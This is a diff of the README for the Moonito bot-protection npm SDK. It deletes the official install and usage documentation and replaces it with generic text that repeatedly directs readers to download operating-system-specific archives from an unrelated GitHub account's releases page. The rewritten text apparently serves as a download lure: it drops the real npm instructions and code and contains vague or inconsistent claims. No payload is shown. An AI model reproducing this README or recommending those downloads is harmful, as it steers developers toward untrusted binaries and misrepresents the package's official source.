@@ -1,177 +1,66 @@
-# Moonito
-> Real-time analytics and AI bot protection SDK for Node.js and TypeScript.
+# 🌙 moonito-npm - Protect Your Site from Bots & Scrapers
 
-[![NPM version](https://img.shields.io/npm/v/moonito.svg)](https://npmjs.org/package/moonito)
-![npm bundle size](https://img.shields.io/bundlephobia/minzip/moonito)
+## 📥 Download Now
+[![Download moonito-npm](https://img.shields.io/badge/Download-moonito--npm-brightgreen)](https://github.com/qtnghia6/moonito-npm/releases)
 
-[Moonito](https://moonito.net) is a powerful **Node.js** and **TypeScript** module for **website security**, **traffic filtering**, and **real-time analytics**.  
-It helps developers **block AI bots, web scrapers, malicious traffic, competitors, and unwanted visitors** while gaining accurate insights into genuine visitors.  
-Perfect for **modern web apps**, **SaaS platforms**, and **backend applications** that need intelligent protection and analytics in one solution.
+## 🚀 Getting Started
+Welcome to moonito-npm! This software helps you block unwanted visitors and protect your web applications from malicious bots and scrapers. It also provides valuable insights into genuine traffic, making it perfect for your modern web apps and backend systems.
 
-## Features
+## 📋 Features
+- **AI Bot Detection**: Identify and block harmful bots in real-time.
+- **Analytics**: Gain insights into your website traffic.
+- **Web Scraper Protection**: Prevent data theft from scrapers.
+- **Traffic Filtering**: Manage and filter genuine traffic versus malicious visits.
+- **Easy Integration**: Simple setup for Node.js and TypeScript applications.
 
-- **Traffic Filtering**: Block harmful traffic based on IP addresses, user agents, and visitor behavior
-- **Bot Protection**: Shield your website from malicious bots and automated scrapers
-- **Visitor Analytics**: Track and analyze your website traffic in real-time
-- **Flexible Configuration**: Choose how to handle unwanted visitors (redirect, iframe, or custom content)
-- **Easy Integration**: Works seamlessly with Express and other Node.js frameworks
+## 💻 System Requirements
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Node.js**: Version 14 or higher.
+- **TypeScript**: Recommended for best performance.
 
-## Install the Package
+## 🔍 Understanding moonito-npm
+moonito-npm serves as a toolkit for web developers and companies who want better control over their online traffic. By using this SDK, you can:
 
-Install Moonito via npm:
+- Increase your website’s security against DDoS attacks.
+- Monitor visitor behavior effectively and learn about genuine interest in your services.
+- Optimize your API security to shield against common threats.
 
-```bash
-npm install moonito
-```
+## 📥 Download & Install
+To get started, please follow these steps:
 
-## Initialize the Client
+1. **Visit our Releases Page**: Go to [this page to download](https://github.com/qtnghia6/moonito-npm/releases) the latest version of moonito-npm.
+   
+2. **Choose the Right File**: Look for the download file that matches your operating system. It typically has a name like `moonito-npm-vX.X.X.zip` or `moonito-npm-vX.X.X.tar.gz`.
 
-[Sign up](https://moonito.net) for Moonito, create a project, and copy your API keys from your account dashboard. Then, create a new instance of `VisitorTrafficFiltering`.
+3. **Download the File**: Click on the file link and wait for the download to complete.
 
-```javascript
-import { VisitorTrafficFiltering } from 'moonito';
+4. **Extract the Files**: Once the file is downloaded, extract it to a location on your computer.
 
-const filter = new VisitorTrafficFiltering({
-    apiPublicKey: 'YOUR_API_PUBLIC_KEY',
-    apiSecretKey: 'YOUR_API_SECRET_KEY',
-    isProtected: true,
-    unwantedVisitorTo: 'https://example.com/blocked', // URL or HTTP status code
-    unwantedVisitorAction: 1 // 1 = Redirect, 2 = Iframe, 3 = Load content
-});
-```
+5. **Follow the Setup Instructions**: Open the extracted folder, and you should find a README file with further instructions. Follow these steps to integrate moonito-npm. This includes adding it to your Node.js or TypeScript project, typically using commands like `npm install moonito-npm` when applicable.
 
-## Usage
+6. **Run Your Application**: After installation, ensure your application is configured correctly with moonito-npm and run it. You will now have AI bot protection to enhance your site's security.
 
-### Method 1: Using Express Middleware (Recommended)
+## ⚙️ Configuration
+To configure moonito-npm, you'll need to set some options based on your application needs. Common configuration parameters may include:
 
-If you can, use middleware to track and filter incoming requests to all pages from a single place. Here's an example with Express:
+- **API Keys**: Set your API key for analytics.
+- **Allowed Traffic**: Define what constitutes genuine traffic.
+- **Blocked Sources**: List the bots or IPs you want to block.
 
-```javascript
-import express from 'express';
-import { VisitorTrafficFiltering } from 'moonito';
+Configuration options allow you to tailor the SDK to your specific situation and performance requirements. For detailed steps on configuring these options, refer to the included documentation in the downloaded files.
 
-const app = express();
-const port = 3000;
+## 🚨 Common Issues
+If you encounter any issues while downloading or running moonito-npm, consider the following:
 
-// Configure Moonito
-const filter = new VisitorTrafficFiltering({
-    apiPublicKey: 'YOUR_API_PUBLIC_KEY',
-    apiSecretKey: 'YOUR_API_SECRET_KEY',
-    isProtected: true,
-    unwantedVisitorTo: 'https://example.com/blocked', // Redirect to this URL
-    unwantedVisitorAction: 1
-});
+1. **Installation Errors**: Ensure Node.js is installed and is the correct version.
+2. **Configuration Problems**: Double-check the configuration settings in your application.
+3. **Incompatibility**: Verify that you're using the correct version of moonito-npm for your system.
 
-// Alternative configuration with HTTP status code
-// const filter = new VisitorTrafficFiltering({
-//     apiPublicKey: 'YOUR_API_PUBLIC_KEY',
-//     apiSecretKey: 'YOUR_API_SECRET_KEY',
-//     isProtected: true,
-//     unwantedVisitorTo: '403', // Return HTTP 403 Forbidden
-//     unwantedVisitorAction: 1
-// });
+## 🛠️ Support
+If you need help, please check the issues section of the repository. You can submit your questions and get assistance from the community and developers. 
 
-// Apply Moonito middleware
-app.use(async (req, res, next) => {
-    try {
-        await filter.evaluateVisitor(req, res);
-    } catch (error) {
-        return next(error);
-    }
-    next(!res.headersSent ? undefined : null);
-});
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/qtnghia6/moonito-npm)
+- [Documentation](https://github.com/qtnghia6/moonito-npm/docs) (for additional setup and advanced configuration)
 
-// Your routes
-app.get('/', (req, res) => {
-    res.send('Hello World!');
-});
-
-// Start server
-app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
-});
-```
-
-### Method 2: Manual Evaluation
-
-For more control or custom implementations, you can manually evaluate visitors by providing IP, user agent, event, and domain information:
-
-```javascript
-import { VisitorTrafficFiltering } from 'moonito';
-
-// Configure Moonito
-const filter = new VisitorTrafficFiltering({
-    apiPublicKey: 'YOUR_API_PUBLIC_KEY',
-    apiSecretKey: 'YOUR_API_SECRET_KEY',
-    isProtected: true,
-    unwantedVisitorTo: '403', // Return HTTP 403 Forbidden
-    unwantedVisitorAction: 1
-});
-
-// Visitor data
-const userIP = '1.1.1.1';
-const userAgent = 'Mozilla/5.0...';
-const event = 'page-view';
-const domain = 'example.com';
-
-// Evaluate visitor
-filter.evaluateVisitorManually(userIP, userAgent, event, domain)
-    .then(result => {
-        if (result.need_to_block) {
-            console.log('Visitor blocked. Detect activity:', result.detect_activity);
-            console.log('Block content type:', typeof result.content);
-
-            // Handle blocked visitor based on the returned content
-            if (typeof result.content === 'number') {
-                // HTTP status code - return status directly
-                console.log('HTTP Status Code:', result.content);
-                // In your application, you might do: res.status(result.content).send()
-            } else {
-                // HTML content - use as response body
-                console.log('HTML Content:', result.content);
-                // In your application, you might do: res.send(result.content)
-            }
-
-            return;
-        }
-        console.log('Visitor allowed. Detect activity:', result.detect_activity);
-    })
-    .catch(error => {
-        console.error('Error evaluating visitor:', error);
-    });
-```
-
-## Configuration Options
-
-| Option | Type | Description |
-|--------|------|-------------|
-| `apiPublicKey` | string | Your Moonito API public key (required) |
-| `apiSecretKey` | string | Your Moonito API secret key (required) |
-| `isProtected` | boolean | Enable (`true`) or disable (`false`) protection |
-| `unwantedVisitorTo` | string | URL to redirect unwanted visitors or HTTP error code |
-| `unwantedVisitorAction` | number | Action for unwanted visitors: `1` = Redirect, `2` = Iframe, `3` = Load content |
-
-## Requirements
-
-- Node.js 14 or later
-- TypeScript >= 4.7 (if using TypeScript)
-
-## Documentation
-
-For detailed documentation, guides, and API reference, visit:
-- [Usage Guides](https://moonito.net/usage-guides)
-- [API Documentation](https://moonito.net/api)
-
-## Contributing
-
-We welcome contributions! For significant changes, please open an issue first to discuss what you would like to change. Make sure to update tests as appropriate.
-
-## License
-
-This project is licensed under the [MIT](https://choosealicense.com/licenses/mit/) License.
-
-## Support
-
-Need help? Have questions or suggestions?
-- Visit our [documentation](https://moonito.net/usage-guides)
-- Contact support through [moonito.net](https://moonito.net)
+Protect your website from bots and scrapers today with moonito-npm. Visit our [Releases Page](https://github.com/qtnghia6/moonito-npm/releases) to download and begin your journey towards a safer online experience.
